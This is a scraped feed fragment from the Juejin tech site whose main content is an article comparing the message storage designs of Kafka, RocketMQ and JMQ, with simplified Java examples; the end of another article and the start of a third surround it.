<p>Fabric.js 是一个非常强大的前端 Canvas 库，随着你不断实践，你会发现它能做的事情远不止本文展示的这些。</p>
<p>如果你有什么想法、问题或希望我继续写的方向，欢迎在评论区告诉我，我会持续更新更多相关内容。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kafka、RocketMQ、JMQ 存储架构深度对比]]></title>    <link>https://juejin.cn/post/7595185093834244131</link>    <guid>https://juejin.cn/post/7595185093834244131</guid>    <pubDate>2026-01-15T09:20:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595185093834244131" data-draft-id="7595403248594272256" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kafka、RocketMQ、JMQ 存储架构深度对比"/> <meta itemprop="keywords" content="架构"/> <meta itemprop="datePublished" content="2026-01-15T09:20:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="京东零售技术"/> <meta itemprop="url" content="https://juejin.cn/user/4233576972293643"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kafka、RocketMQ、JMQ 存储架构深度对比
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4233576972293643/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    京东零售技术
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T09:20:19.000Z" title="Thu Jan 15 2026 09:20:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>消息队列的存储架构是决定其可靠性、吞吐量、延迟性能的核心因素，直接影响业务场景适配能力。本文聚焦三款主流消息队列 ——Kafka（LinkedIn 开源，侧重高吞吐）、RocketMQ（阿里开源，金融级特性突出）、JMQ（京东开源，侧重高可用与灵活性），从存储模型、数据组织、索引设计等维度展开深度对比，为技术选型与架构优化提供参考。</p>
<p>本文将从概念辨析出发，系统拆解主流存储模型与存储引擎的设计逻辑，对比 JMQ、Kafka、RocketMQ的技术选型差异与架构设计。</p>
<h2 data-id="heading-0">01.Kafka存储架构</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/efa8e89877aa464e8efc2707c2e88445~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic6Zu25ZSu5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073619&amp;x-signature=xCOLo%2FDhAG7DLAFeNYvKNJzAGZQ%3D" alt="image.png" loading="lazy"/></p>
<p>Topic - 主题</p>
<p>Kafka学习了数据库里面的设计，在里面设计了topic（主题），这个东西类似于关系型数据库的表，此时我需要获取中国移动的数据，那就直接监听中国移动订阅的Topic即可。</p>
<p>Partition - 分区</p>
<p>Kafka还有一个概念叫Partition（分区），分区具体在服务器上面表现起初就是一个目录，一个主题下面有多个分区，这些分区会存储到不同的服务器上面，或者说，其实就是在不同的主机上建了不同的目录。这些分区主要的信息就存在了.log文件里面。跟数据库里面的分区差不多，是为了提高性能。</p>
<p>至于为什么提高了性能，很简单，多个分区多个线程，多个线程并行处理肯定会比单线程好得多。</p>
<p>Topic和partition像是HBASE里的table和region的概念，table只是一个逻辑上的概念，真正存储数据的是region，这些region会分布式地存储在各个服务器上面，对应于kafka，也是一样，Topic也是逻辑概念，而partition就是分布式存储单元。这个设计是保证了海量数据处理的基础。我们可以对比一下，如果HDFS没有block的设计，一个100T的文件也只能单独放在一个服务器上面，那就直接占满整个服务器了，引入block后，大文件可以分散存储在不同的服务器上。</p>
<p>注意：</p>
<p>1.分区会有单点故障问题，所以我们会为每个分区设置副本数</p>
<p>2.分区的编号是从0开始的</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7e0dede4a9b1497e8d3113c76045eb34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic6Zu25ZSu5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073619&amp;x-signature=R%2FEqquVTThnxyGAv1YlIpR4K05o%3D" alt="image.png" loading="lazy"/></p>
<p>Kafka 以「主题（Topic）- 分区（Partition）」为核心组织数据，每个分区本质是一个 append-only 的日志流，消息按生产顺序追加存储，保证分区内消息有序性。</p>
<p>优点：可以充分利用磁盘顺序读写高性能的特性。存储介质也可以选择廉价的SATA磁盘，这样可以获得更长的数据保留时间、更低的数据存储成本。</p>
<p>1.2 数据组织：分段日志文件
每个分区拆分为多个 Segment 文件（默认 1GB），命名格式为「起始偏移量.log」（如 00000000000000000000.log），做这个限制目的是为了方便把.log加载到内存去操作</p>
<p>配套两类索引文件：.index（偏移量→物理地址映射）、.timeindex（时间戳→偏移量映射）。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/98fe200edd1d43f3b8c4f9a8bf84829f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic6Zu25ZSu5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073619&amp;x-signature=1t46LG3yo8KfjK%2BuOQaUfnGozm8%3D" alt="image.png" loading="lazy"/></p>
<p>这个9936472之类的数字，就是代表了这个日志段文件里包含的起始offset，也就说明这个分区里至少都写入了接近1000万条数据了。</p>
<p>Kafka broker有一个参数，log.segment.bytes，限定了每个日志段文件的大小，最大就是1GB，一个日志段文件满了，就自动开一个新的日志段文件来写入，避免单个文件过大，影响文件的读写性能，这个过程叫做log rolling，正在被写入的那个日志段文件，叫做active log segment。</p>
<p>1.3 消息读/写过程</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87dd3b1cfb164f51abad77b5d5c2e908~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic6Zu25ZSu5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073619&amp;x-signature=JocCiiCp2n3WPuxQrcpIa81sA8g%3D" alt="image.png" loading="lazy"/></p>
<p>写消息：</p>
<p>Index文件写入，Index文件较小，可以直接用mmap进行内存映射，避免频繁的磁盘I/O操作，提高写入性能；由于Index文件是稀疏索引，只需要记录关键位置的偏移量，因此即使使用mmap，写入的开销也相对较低。</p>
<p>Segment文件写入，Segment文件较大，可以采用普通的写操作（FileChannel.write），由于Segment文件是顺序写入的，并且Kafka会利用操作系统的PageCache（页缓存）机制，写入操作会先写入到内存中，然后由操作系统在后台异步刷新到磁盘，可以进一步提高写入的性能。</p>
<p>读消息：</p>
<p>Index文件读取，通常使用mmap方式读取，由于Index文件较小，且是稀疏索引，缺页中断的可能性较小。</p>
<p>Segment文件读取，通常使用sendfile系统调用来实现零拷贝读取和发送，减少数据在用户空间与内核空间之间的拷贝次数，提高数据传输的效率。</p>
<p>1.4 关键技术
Kafka 作为高性能的消息中间件，其超高吞吐量的核心秘诀之一就是深度依赖 PageCache + 顺序 I/O + mmap 内存映射的组合。</p>
<p>PageCache，中文名称为页高速缓冲存储器。它是将磁盘上的数据加载到内存中，当系统需要访问这些数据时，可以直接从内存中读取，而不必每次都去读取磁盘。这种方式显著减少了磁盘I/O操作，从而提高了系统性能。</p>
<p>mmap（Memory-mapped file）是操作系统提供的一种将磁盘文件与进程虚拟地址空间建立映射关系的核心技术，本质是让进程通过直接操作内存地址的方式读写文件，无需传统的 read/write 系统调用。核心价值在于零拷贝和内存式文件访问，尤其适合大文件、高吞吐、随机访问的场景。</p>
<p>将日志段（.log）文件映射到内存，生产者写入时直接写内存（内核异步刷盘），消费者读取时直接从内存读取，实现超高吞吐（Kafka 的 “顺序写 + mmap” 是其高性能核心）；</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a78dd2bbace8471c95616863c90a6a21~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic6Zu25ZSu5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073619&amp;x-signature=AuQpCNAvLj6Ru2bgsycYsEAsCyY%3D" alt="image.png" loading="lazy"/></p>
<p>零拷贝流程示意图</p>
<p>零拷贝过程：</p>
<p>1.用户进程发起sendfile系统调用，上下文（切换1）从用户态转向内核态</p>
<p>2.DMA控制器，把数据从硬盘中拷贝到内核缓冲区。</p>
<p>3.CPU将读缓冲区中数据拷贝到socket缓冲区</p>
<p>4.DMA控制器，异步把数据从socket缓冲区拷贝到网卡，</p>
<p>5.上下文（切换2）从内核态切换回用户态，sendfile调用返回。</p>
<p>1.5 设计优势
•顺序写磁盘：Segment 文件仅追加写入，规避随机 IO，吞吐量极高（单分区可达 10 万 + TPS）</p>
<p>•索引轻量化：仅维护偏移量与时间戳索引，降低存储开销</p>
<p>•副本同步：基于 ISR 机制，仅同步已提交消息，兼顾一致性与可用性</p>
<h2 data-id="heading-1">02.RocketMQ存储架构</h2>
<p>Kafka的每个Partition都是一个完整的、顺序写入的文件，但当Partition数量增多时，从操作系统的角度看，这些写入操作会变得相对随机，这可能会影响写入性能。</p>
<p>2.1 核心存储模型：分离式设计</p>
<p>RocketMQ采用「CommitLog + ConsumeQueue + IndexFile」三层结构，彻底分离数据存储与索引查询：</p>
<p>CommitLog：全局单一日志文件（默认 1GB / 个，循环覆盖），存储所有主题的原始消息</p>
<p>ConsumeQueue：按主题 - 队列维度拆分的索引文件，存储「消息物理地址 + 偏移量 + 长度」，供消费者快速查询</p>
<p>IndexFile：哈希索引文件，支持按消息 Key 查询</p>
<p>CommitLog：消息的原始日记本</p>
<p>CommitLog是RocketMQ存储消息的物理文件，所有消息都会按到达顺序写入这个文件。你可以把它想象成一本不断追加的日记本——每条消息都是按时间顺序记录的新日记。</p>
<p>// 消息存储的核心逻辑简化示例（非源码）
public void putMessage(Message message) {
// 1. 将消息序列化为字节数组
byte[] data = serialize(message);
// 2. 计算消息物理偏移量
long offset = commitLog.getMaxOffset();
// 3. 将数据追加到CommitLog文件末尾
commitLog.append(data);
// 4. 返回消息的全局唯一物理偏移量
return offset;
}
AI写代码
消息写入CommitLog时有三个关键特性：</p>
<p>1.顺序写入：所有消息按到达顺序追加到文件末尾，避免磁盘随机寻址</p>
<p>2.内存映射：通过MappedByteBuffer实现文件映射，减少数据拷贝次数</p>
<p>3.文件分割：单个CommitLog文件默认1GB，写满后创建新文件（文件名用起始偏移量命名）</p>
<p>举个例子，当生产者发送三条消息时，CommitLog文件可能长这样：</p>
<p>0000000000000000000（文件1，1GB）<br/>
2|--消息A(offset=0)<br/>
3|--消息B(offset=100)<br/>
4|--消息C(offset=200)<br/>
500000000001073741824（文件2，起始偏移量1073741824）<br/>
AI写代码
温馨提示：虽然CommitLog是顺序写，但读取时需要配合索引结构，否则遍历文件找消息就像大海捞针。</p>
<p>消费队列ConsumeQueue：消息的快速目录</p>
<p>如果每次消费都要扫描CommitLog，性能会惨不忍睹。于是RocketMQ设计了ConsumeQueue——它是基于Topic和Queue的二级索引文件。</p>
<p>每个ConsumeQueue条目包含三个关键信息（固定20字节）：</p>
<p>1| CommitLog Offset (8字节) | Message Size (4字节) | Tag Hashcode (8字节) |<br/>
AI写代码
这相当于给CommitLog里的消息做了一个目录：</p>
<p>TopicA-Queue0的ConsumeQueue<br/>
2|--0（对应CommitLog偏移0的消息A）<br/>
3|--100（对应CommitLog偏移100的消息B）<br/>
4|--200（对应CommitLog偏移200的消息C）
AI写代码
当消费者拉取TopicA-Queue0的消息时：</p>
<p>1.先查ConsumeQueue获取消息的物理位置</p>
<p>2.根据CommitLog Offset直接定位到CommitLog文件</p>
<p>3.读取指定位置的消息内容</p>
<p>关键设计点：</p>
<p>ConsumeQueue采用内存映射+异步刷盘，保证高性能</p>
<p>单个文件存储30万条索引，约5.72MB（30万*20字节）</p>
<p>通过hashCode快速过滤Tag，实现消息过滤</p>
<p>索引文件IndexFile：消息的全局字典</p>
<p>如果需要根据MessageID或Key查询消息，ConsumeQueue就不够用了。这时候就要用到IndexFile这个全局索引。</p>
<p>IndexFile的结构类似HashMap：</p>
<p>1.Slot槽位（500万个）：存储相同hash值的Index条目链表头</p>
<p>2.Index条目（2000万条）：包含Key的hash值、CommitLog偏移量、时间差等信息</p>
<p>当写入消息时：</p>
<p>// 索引构建过程简化示意
public void buildIndex(Message message) {
// 计算Key的hash值
int hash = hash(message.getKey());
// 定位到对应的Slot槽位
int slotPos = hash % slotNum;
// 在Index区域追加新条目
indexFile.addEntry(hash, message.getCommitLogOffset());
}
AI写代码
查询时通过两次查找快速定位：</p>
<p>1.根据Key的hash值找到Slot槽位</p>
<p>2.遍历Slot对应的链表，比对CommitLog中的实际Key值</p>
<p>性能优化必知：</p>
<p>消息体积差异大时，CommitLog仍然保持顺序写，但ConsumeQueue可能出现「稀疏索引」（相邻索引指向的物理位置间隔大）</p>
<p>生产环境中CommitLog建议放在单独SSD磁盘，ConsumeQueue和IndexFile可放普通磁盘</p>
<p>遇到消息堆积时，优先检查消费者速度，而不是无脑扩容Broker存储</p>
<p>理解这些底层机制，下次遇到消息查询性能问题或者磁盘IO瓶颈时，就知道该从CommitLog的写入模式还是ConsumeQueue的索引结构入手排查了。</p>
<p>2.2 数据流转机制
生产者写入 CommitLog，生成全局唯一偏移量（PHYOFFSET）</p>
<p>后台线程异步构建 ConsumeQueue 索引，同步消息元数据</p>
<p>消费者通过 ConsumeQueue 定位 CommitLog 中的消息，避免全量扫描</p>
<p>存储过程全景图</p>
<p>现在把各个模块串起来看消息的生命周期：</p>
<p>1.生产者发送消息到Broker</p>
<p>2.Broker将消息顺序写入CommitLog</p>
<p>3.异步线程同时构建ConsumeQueue和IndexFile</p>
<p>4.消费者通过ConsumeQueue快速定位消息</p>
<p>5.按需查询IndexFile实现消息回溯</p>
<p>整个过程就像图书馆的管理系统：</p>
<p>CommitLog是藏书库（按入库时间摆放）</p>
<p>ConsumeQueue是分类目录（按题材/出版社分类）</p>
<p>IndexFile是检索电脑（支持按书名/作者查询）</p>
<p>2.3 设计优势
读写分离：CommitLog 仅负责写入，ConsumeQueue 负责查询，提升并发性能</p>
<p>事务支持：通过 CommitLog 中的事务状态标记 + 回查机制，实现分布式事务消息</p>
<p>刷盘策略：支持「异步刷盘（高吞吐）」「同步刷盘（金融级可靠性）」动态切换。</p>
<h2 data-id="heading-2">03.JMQ存储架构</h2>
<p>JMQ的消息存储分别参考了Kafka和RocketMQ存储设计上优点，并根据京东内部的应用场景进行了改进和创新。</p>
<p>3.1 核心存储模型：分区日志 + 队列兼容</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7d0ce7ad41a47fb82d8f7057ce9b313~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic6Zu25ZSu5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073619&amp;x-signature=JROr2XwPO1BI0%2BYmDu%2FwNZL%2BVDo%3D" alt="image.png" loading="lazy"/></p>
<p>JMQ存储的基本单元是PartitionGroup。在同一个Broker上，每个PartitionGroup对应一组消息文件（Journal Files），顺序存放这个Topic的消息。</p>
<p>与Kafka类似，每个Topic包含若干Partition，每个Partition对应一组索引文件（Index Files），索引中存放消息在消息文件中的位置和消息长度。消息写入时，收到的消息按照对应的PartitionGroup写入依次追加写入消息文件中，然后异步创建索引并写入对应Partition的索引文件中。</p>
<p>以PartionGroup为基本存储单元的设计，在兼顾灵活性的同时，具有较好的性能，并且单个PartitionGroup可以支持更多的并发。</p>
<p>3.2 消息读/写过程</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b87983dfc5584cebbdd75b1f3abde585~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic6Zu25ZSu5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073619&amp;x-signature=mojnShAVOt0Jt1OBHxDhGo3qXuc%3D" alt="image.png" loading="lazy"/></p>
<p>写消息：</p>
<p>JMQ的写操作使用DirectBuffer作为缓存，数据先写入DirectBuffer，再异步通过FileChannel写入到文件中。</p>
<p>消息写入DirectBuffer后，默认写入该节点成功（数据的高可靠是通过Raft协议复制，用多个内存副本来保证），相对Kafka的写操作来看，JMQ响应写入请求的处理过程没有发生系统调用，在京东内部的大量单条同步发送的场景下开销更低、性能更优。</p>
<p>同时也避免使用MappedByteBuffer（Mmap方式）产生Page Fault中断，OS在中断中将该页对应磁盘中的数据拷贝到内存中，在对文件进行追加写入的情况下，这一无法避免的过程是完全没有必要，反而增加了写入的耗时的问题。</p>
<p>读消息：</p>
<p>JMQ采用定长稠密索引设计，每个索引固定长度。</p>
<p>定长设计的好处是，直接根据索引序号就可以计算出索引在文件中的位置：索引位置 = 索引序号 * 索引长度。这样，消息的查找过程就比较简单了，首先计算出索引所在的位置，直接读取索引，然后根据索引中记录的消息位置读取消息。</p>
<p>在京东内部应用场景中，单条消息处理耗时高是比较常见的，微服务架构下用户一般会申请更多的消费节点，让每个消费节点单次拉取较小批量的消息进行处理，以提升消费并行度，这样消费拉取请求的次数会比较多，稠密索引的设计会更适用内部的应用场景。</p>
<p>JMQ消费读操作99%以上都能命中缓存（JMQ设计的堆外内存与文件映射的一种缓存机制），避免了Kafka可能遇到的Cache被污染，影响性能和吞吐的问题。同时直接读内存也规避了RocketMQ在读取消息存储的日志数据文件时容易产生较多的随机访问读取磁盘，影响性能的问题。（当没有命中缓存时，会默认降级为通过Mmap的方式读取消息）。</p>
<h2 data-id="heading-3">04.竞品对比分析</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aec6ef9c771743f9b82f4c0dd3f30fcc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic6Zu25ZSu5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073619&amp;x-signature=S27xs%2B491GxK9kKV0Rc8w19JDDA%3D" alt="image.png" loading="lazy"/>
在单副本场景下，JMQ与Kafka的单机写入性能均十分出色，均可达到网络带宽上限。</p>
<p>然而，在更贴近生产环境的三副本场景中，两者特性出现分化：</p>
<p>JMQ在三副本异步写入下的极限吞吐优势明显，且在跨机房部署时，其同步写入性能表现良好，几乎不受网络延迟影响；而Kafka则在多分区同步写入场景下展现出更稳定的性能，衰减小于JMQ。在大部分异步吞吐场景及不同消息体下的性能趋势上，两者表现相当。</p>
<p>综上所述，JMQ尤其适合对同步写入性能和副本异步吞吐有极高要求的场景，而Kafka在复杂分区的高并发同步写入方面适应性更广。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[我不允许谁还分不清这三种watch机制的区别]]></title>    <link>https://juejin.cn/post/7595341943338729482</link>    <guid>https://juejin.cn/post/7595341943338729482</guid>    <pubDate>2026-01-15T09:41:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595341943338729482" data-draft-id="7595358285722976265" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="我不允许谁还分不清这三种watch机制的区别"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-15T09:41:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="有态度的下等马"/> <meta itemprop="url" content="https://juejin.cn/user/448256476727662"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            我不允许谁还分不清这三种watch机制的区别
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/448256476727662/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    有态度的下等马
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T09:41:24.000Z" title="Thu Jan 15 2026 09:41:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body 